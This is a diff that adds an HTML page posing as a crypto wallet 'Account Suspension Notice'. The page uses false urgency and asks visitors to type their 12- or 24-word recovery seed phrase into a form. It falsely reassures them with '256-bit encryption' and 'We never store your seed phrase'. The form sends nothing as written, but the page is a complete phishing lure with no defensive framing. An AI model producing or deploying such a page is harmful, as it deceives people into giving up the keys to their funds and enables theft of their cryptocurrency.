@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Urgent: Verify Your Crypto Wallet</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            max-width: 400px;
+        }
+
+        .logo {
+            width: 80px;
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            color: #d9534f;
+            margin-top: 0;
+        }
+
+        p {
+            color: #555;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        textarea {
+            width: 100%;
+            height: 80px;
+            margin: 15px 0;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+
+        button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+
+        .warning {
+            font-size: 12px;
+            color: #888;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="container">
+        <h2 id="urgent-notice">⚠️ Account Suspension Notice</h2>
+        <p>Due to suspicious activity, your cryptocurrency wallet has been temporarily locked. To prevent permanent loss
+            of your funds, you must verify your identity immediately.</p>
+
+        <p><strong>Please enter your 12-word or 24-word recovery seed phrase below to unlock your wallet:</strong></p>
+
+        <textarea placeholder="e.g. apple banana dog cat..."></textarea>
+
+        <button>Verify and Unlock Wallet</button>
+
+        <p class="warning">Secure 256-bit encryption. We never store your seed phrase.</p>
+    </div>
+
+</body>
+
+</html>
